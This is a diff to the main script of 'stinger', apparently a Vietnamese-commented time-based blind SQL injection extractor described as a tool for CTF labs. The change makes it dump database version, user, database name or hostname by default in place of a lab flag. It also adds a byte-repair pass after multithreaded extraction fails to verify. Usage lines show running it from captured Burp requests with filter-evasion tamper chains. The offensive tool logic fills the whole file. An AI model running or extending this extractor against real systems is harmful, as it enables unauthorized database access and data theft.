@@ -5,7 +5,8 @@ stinger - inline time-based blind SQLi extractor cho lab CTF.
 Ghép tất cả: parse Burp request -> đo/chốt vector (TRUE/FALSE) -> trích xuất -> verify.
 
 Ví dụ (chạy từ thư mục root qua main.py):
-    python main.py -r draft/requests.txt --query "select content from final_flag limit 1"
+    python main.py -r req.txt                          # mặc định: select version()
+    python main.py -r req.txt --query "select content from final_flag limit 1"
     python main.py -r req.txt --dbms mysql --vector mysql-inline-sleep
     python main.py -r req.txt --tamper between,space2comment
     python main.py -r req.txt --dbms auto -v
@@ -23,10 +24,13 @@ from stinger.request import parse_request_file, RequestParseError
 from stinger.transport import Transport, TransportError
 from stinger.vectors import VectorStore, detect_vector, VectorError
 from stinger.oracle import Oracle
-from stinger.extract import extract, verify, ExtractError
+from stinger.extract import extract, verify, repair, ExtractError
 from stinger.tamper_engine import TamperChain, TamperError
 
-DEFAULT_QUERY = "select content from final_flag limit 1"
+# Khi không truyền --query, tool dùng query mặc định THEO DBMS đã chốt (version/database/
+# user), lấy từ vectors.yaml. Không hardcode một câu vì mỗi DBMS có cú pháp riêng
+# (MySQL version() vs MSSQL @@version vs Oracle v$version...).
+DEFAULT_QUERY_KIND = "version"
 
 
 def _build_measure(transport, tamper_chain, dbms_hint):
@@ -51,8 +55,12 @@ def main(argv=None):
     )
     p.add_argument("-r", "--request", required=True,
                    help="file request (Burp), có marker '*' ở vị trí inject")
-    p.add_argument("--query", default=DEFAULT_QUERY,
-                   help="câu truy vấn cần trích xuất (mặc định: lấy flag)")
+    p.add_argument("--query", default=None,
+                   help="câu truy vấn cần trích xuất. Mặc định: query version() theo DBMS "
+                        "đã chốt. Vd lấy flag: --query \"select content from final_flag limit 1\"")
+    p.add_argument("--dump", default=DEFAULT_QUERY_KIND,
+                   choices=("version", "database", "user", "hostname"),
+                   help="khi không có --query, dump thông tin gì theo DBMS (mặc định version)")
     p.add_argument("--dbms", default="auto",
                    help="mysql|postgresql|mssql|oracle|auto (mặc định auto)")
     p.add_argument("--vector", default=None,
@@ -94,7 +102,10 @@ def main(argv=None):
     print("[*] target : %s" % base.url())
     print("[*] method : %s" % base.method)
     print("[*] marker : %s" % base.marker_location())
-    print("[*] query  : %s" % a.query)
+    if a.query:
+        print("[*] query  : %s" % a.query)
+    else:
+        print("[*] query  : (mặc định '%s' theo DBMS sẽ chốt)" % a.dump)
 
     # 2) tamper chain (nếu có)
     tamper_chain = None
@@ -134,6 +145,17 @@ def main(argv=None):
 
     dialect = store.dialect(detect.vector.dbms)
 
+    # 4c) Quyết query: nếu người dùng không truyền --query -> dùng query mặc định THEO
+    # DBMS đã chốt (mỗi DBMS cú pháp riêng). Giờ mới biết DBMS nên resolve ở đây.
+    query = a.query
+    if not query:
+        try:
+            query = store.default_query(detect.vector.dbms, a.dump)
+        except VectorError as e:
+            print("[!] %s" % e)
+            return 2
+        print("[*] query mặc định (%s/%s): %s" % (detect.vector.dbms, a.dump, query))
+
     # 5) trích xuất
     oracle = Oracle(detect, measure, sleeptime=a.delay,
                     votes=a.votes, verbose=a.verbose, log=log)
@@ -141,10 +163,10 @@ def main(argv=None):
     def progress(done, total, preview):
         print("\r[%3d/%s] %s" % (done, total, preview), end="", flush=True)
 
-    print("\n[*] trích xuất (chế độ %s, DBMS %s)...\n" % (a.mode, detect.vector.dbms))
+    print("\n[*] Trích xuất (chế độ %s, DBMS %s)...\n" % (a.mode, detect.vector.dbms))
     t0 = time.time()
     try:
-        data, meta = extract(oracle, a.query, dialect, mode=a.mode,
+        data, meta = extract(oracle, query, dialect, mode=a.mode,
                              maxlen=a.maxlen, threads=a.threads,
                              progress=progress, log=log)
     except ExtractError as e:
@@ -152,12 +174,22 @@ def main(argv=None):
         return 3
     print()
 
-    # 6) verify
+    # 6) verify. Nếu đọc đa luồng và verify KHÔNG khớp -> pha kiểm chứng 1 luồng:
+    #    verify từng byte + đọc lại byte sai (chính xác, không nhiễu vì tuần tự).
     ok = False
     try:
-        ok = verify(oracle, a.query, dialect, data)
+        ok = verify(oracle, query, dialect, data)
     except Exception:
         pass
+
+    if not ok and a.threads > 1 and a.mode == "hex":
+        print("\n[*] verify KHÔNG KHỚP - kiểm chứng & sửa từng byte bằng 1 luồng...")
+        try:
+            data = repair(oracle, query, dialect, data, log=log)
+            ok = verify(oracle, query, dialect, data)
+            meta["char_len"] = len(data.decode("utf-8", "replace"))
+        except Exception as e:
+            print("[!] lỗi khi sửa: %s" % e)
 
     # 7) kết quả
     print("\n" + "=" * 60)
@@ -170,8 +202,8 @@ def main(argv=None):
     print("chi phí   : %d request, %.0fs" % (transport.n_req, time.time() - t0))
     print("=" * 60)
     if not ok and a.threads > 1:
-        print("[!] verify KHÔNG KHỚP - kết quả có thể sai do nhiễu khi chạy %d luồng.\n"
-              "    Thử lại với --threads 1 (hoặc số nhỏ hơn) để tăng độ tin cậy."
+        print("[!] verify KHÔNG KHỚP - có thể do nhiễu khi chạy %d luồng.\n"
+              "    Thử lại với --threads nhỏ hơn (vd 3-5) hoặc tăng --delay."
               % a.threads)
     return 0 if ok else 1
 
